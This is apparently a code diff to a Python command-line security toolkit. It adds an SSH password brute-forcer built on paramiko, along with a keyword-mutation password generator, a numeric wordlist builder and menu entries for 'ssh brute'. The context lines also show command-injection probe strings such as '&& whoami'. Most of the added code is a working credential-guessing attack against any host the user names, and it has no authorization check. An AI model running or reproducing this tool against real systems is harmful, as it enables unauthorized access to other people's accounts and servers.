@@ -13,6 +13,7 @@ import whois
 from zxcvbn import zxcvbn
 import math
 import re
+import paramiko
 
 init(autoreset=True)
 
@@ -204,7 +205,6 @@ class WebSec:
             "&& whoami",
             "| whoami"
         ]
-        
         print("\nTesting for Command Injection...")
         found_vulnerability = False
         severity = "None"
@@ -330,7 +330,7 @@ def sys_scan():
                 entropy = calc_entropy(file_path)
                 if entropy > 7.5:
                     malicious_files.append((file_path,"High Entropy"))
-    print(Fore.GREEN+"\n\nScan complete!")
+    print(Fore.GREEN+"\n\nSystem scan complete!")
 
     if malicious_files:
         print("\nPotential malicious files found:")
@@ -459,28 +459,132 @@ def check_password_strength(password):
     strength_levels = ["Very Weak", "Weak", "Moderate", "Strong", "Very Strong"]
     strength_level = strength_levels[score]
     return strength_level, feedback, cracked_time
- 
+
+def generate_combinations(keywords):
+    special_chars = ['_', '@', '!', '#', '$', '%', '&', '*', '-', '+', '=', '.']
+    trails = ['123', '!', '@123', '_', '', '123!']
+    all_combinations = set()
+
+    for keyword in keywords:
+        if len(keyword) >= 3:
+            base_variations = [
+                keyword.lower(),
+                keyword.upper(),
+                keyword.capitalize(),
+                keyword.swapcase(),
+            ]
+
+            for variation in base_variations:
+                all_combinations.add(variation)
+
+                for special_char in special_chars:
+                    all_combinations.add(special_char + variation)
+                    all_combinations.add(variation + special_char)
+
+                for trail in trails:
+                    all_combinations.add(variation + trail)
+
+                for i in range(len(variation) + 1):
+                    for special_char in special_chars:
+                        new_combination = variation[:i] + special_char + variation[i:]
+                        all_combinations.add(new_combination)
+
+                for i in range(len(variation)):
+                    for special_char in special_chars:
+                        new_combination = variation[:i+1] + special_char + variation[i+1:]
+                        all_combinations.add(new_combination)
+
+                if '_' not in variation:
+                    new_combination = variation.replace('', '_')[1:-1] 
+                    all_combinations.add(new_combination)
+
+        else:
+            print(Fore.RED + "Keyword must atleast be a 3 word letter")
+
+    return all_combinations
+
+    
+def read_wordlist(wordlist_file):
+    with open(wordlist_file,'r') as file:
+        return set(line.strip() for line in file)
+    
+def bruteforce(hostname, username, passwords, port=22):
+    for password in passwords:
+        try:
+            print(Fore.CYAN + f"[*] Trying password: {password}" + Style.RESET_ALL)
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            client.connect(hostname, port=port, username=username, password=password, timeout=5)
+            print(Fore.GREEN + f"[+] Success! Password found: {password}" + Style.RESET_ALL)
+            return password
+        except paramiko.AuthenticationException:
+            print(Fore.RED + f"[-] Failed: {password}" + Style.RESET_ALL)
+        except Exception as e:
+            print(Fore.RED + f"[!] Error: {str(e)}" + Style.RESET_ALL)
+        finally:
+            client.close()
+    return None
+
+def cracker():
+    hostname = input(Fore.YELLOW + "Enter SSH hostname: " + Style.RESET_ALL)
+    username = input(Fore.YELLOW + "Enter SSH username: " + Style.RESET_ALL)
+    method = input(Fore.YELLOW + "Use wordlist or keywords (enter 'wordlist' or 'keywords'): " + Style.RESET_ALL)
+
+    if method == 'wordlist':
+        wordlist = input(Fore.YELLOW + "Enter path to wordlist: " + Style.RESET_ALL)
+        passwords = read_wordlist(wordlist)
+        print(Fore.GREEN + f"[+] Loaded {len(passwords)} passwords from the wordlist." + Style.RESET_ALL)
+        success = bruteforce(hostname, username, passwords)
+    elif method == 'keywords':
+        keywords = input(Fore.YELLOW + "Enter keywords separated by space: " + Style.RESET_ALL).split()
+        passwords = generate_combinations(keywords)
+        print(Fore.GREEN + f"[+] Generated {len(passwords)} password combinations." + Style.RESET_ALL)
+        success = bruteforce(hostname, username, passwords)
+
+    if success:
+        print(Fore.GREEN + f"[+] Password successfully found: {success}" + Style.RESET_ALL)
+    else:
+        print(Fore.RED + "[-] No password found. Try expanding the wordlist or keyword combinations." + Style.RESET_ALL)
+
+def create_custom_wordlist():
+    print(Fore.YELLOW + "Enter the range of numbes for the wordlist"+Style.RESET_ALL)
+    start = int(input(Fore.YELLOW + "Enter starting number:" + Style.RESET_ALL))
+    end = int(input(Fore.YELLOW + "Enter ending number:" + Style.RESET_ALL)) 
+
+    wordlist = [str(i).zfill(3) for i in range(start, end+1 )]
+
+    file_name = input(Fore.YELLOW + "Name of wordlist: " + Style.RESET_ALL) + ".txt"
+    with open(file_name, 'w') as f:
+        for item in wordlist:
+            f.write(f"{item}\n")
+
+    print(Fore.GREEN + f"Custom wordlist created and saved as {file_name}" + Style.RESET_ALL)
+
 
 def display_help():
     help_text = """
 
        Commands:
-       
-     ---|-------------------------------------------------------------------------------------|---
-        | run websec          : Launches the WebSec security testing tool.                    |
-        | sys scan            : Scans the system for malicious files and software.            |
-        | run hunter          : Search for a person online and relevant information.          |
-        | search web          : Searches the web for specified keywords and returns a summary.|
-        | run script <script> : Executes a specified Python or Batch script directly.         |
-        | cipher <password>   : Evaluates the strength of the provided password.              |
-        | geo <ip_address>    : Provides geographical information about an IP address.        |
-        | calc                : Performs basic calculations.                                  |
-        | clear               : Clears the command line screen.                               |
-        | exit                : Exits the evolve tool.                                        |
-     ---|-------------------------------------------------------------------------------------|---
-
+         ____________________________________________________________________________________________
+        | run websec          : Launches the WebSec security testing tool.                           |
+        | sys scan            : Scans the system for malicious files and software.                   |
+        | run hunter          : Search for a person online and relevant information.                 | 
+        | search web          : Searches the web for specified keywords and returns a summary.       |
+        | run script <script> : Executes a specified Python or Batch script directly.                |
+        | cipher <password>   : Evaluates the strength of the provided password.                     |
+        | geo <ip_address>    : Provides geographical information about an IP address.               |
+        | calc                : Performs basic calculations.                                         |
+        | clear               : Clears the command line screen.                                      |
+        | exit                : Exits the evolve tool.                                               |
+        | run cracker         : Launches the cracker tool for brute force password attacks.          |
+        |   --- Subcommands for Cracker:                                                             |
+        |   ssh brute         : Initiates an SSH brute force attack using a wordlist or keywords.    |
+        |   cracker create    : Creates a custom wordlist based on a specified range of numbers.     |
+        |   quit              : Exits the cracker tool and returns to the previous menu.             |
+        |____________________________________________________________________________________________|
     """
     print(Fore.LIGHTGREEN_EX + help_text + Style.RESET_ALL)
+
 
 
 def main():
@@ -595,6 +699,42 @@ def main():
             print(Fore.GREEN+"Search Results : "+Style.RESET_ALL)
             for link in results:
                 print(Fore.LIGHTCYAN_EX+" * ",link)
+
+        elif command == "run cracker":
+            while True:
+                sub_command = input(Fore.GREEN + "cracker>>"+Style.RESET_ALL).strip().lower()
+
+                if sub_command == "ssh brute":
+                    hostname = input(Fore.YELLOW + "Enter SSH hostname: " + Style.RESET_ALL)
+                    username = input(Fore.YELLOW + "Enter SSH username: " + Style.RESET_ALL)
+                    method = input(Fore.YELLOW + "Use wordlist or keywords (enter 'wordlist' or 'keywords'): " + Style.RESET_ALL)
+
+                    if method == 'wordlist':
+                        wordlist = input(Fore.YELLOW + "Enter path to wordlist : " + Style.RESET_ALL)
+                        passwords = read_wordlist(wordlist)
+                        print(Fore.GREEN + f"[+] Loaded {len(passwords)} passwords from the wordlist." + Style.RESET_ALL)
+                        success = bruteforce(hostname, username, passwords)
+                    
+                    elif method == 'keywords':
+                        keywords = input(Fore.YELLOW+ "Enter keywords seperated by space : "+Style.RESET_ALL).split()
+                        passwords = generate_combinations(keywords)
+                        print(Fore.GREEN + f"[+]Generated {len(passwords)} password combinations" + Style.RESET_ALL)
+                        success = bruteforce(hostname,username,passwords)
+
+                elif sub_command == "quit":
+                    break
+
+                elif sub_command == "cracker create":
+                    create_custom_wordlist()
+
+                else:
+                    print(Fore.RED + "Invalid cracker command.")
+                    print(Fore.CYAN + "Valid commands : 'ssh brute', 'cracker create' 'exit', 'quit'" + Style.RESET_ALL)
+
+                    if success:
+                        print(Fore.GREEN + f"Password successfully found: {success}" + Style.RESET_ALL)
+                    else:
+                        print(Fore.RED + "No password found. Try expanding the wordlist or keyword combinations." + Style.RESET_ALL)
 
         elif command == "search web":
             query = input("What should I search for : ")
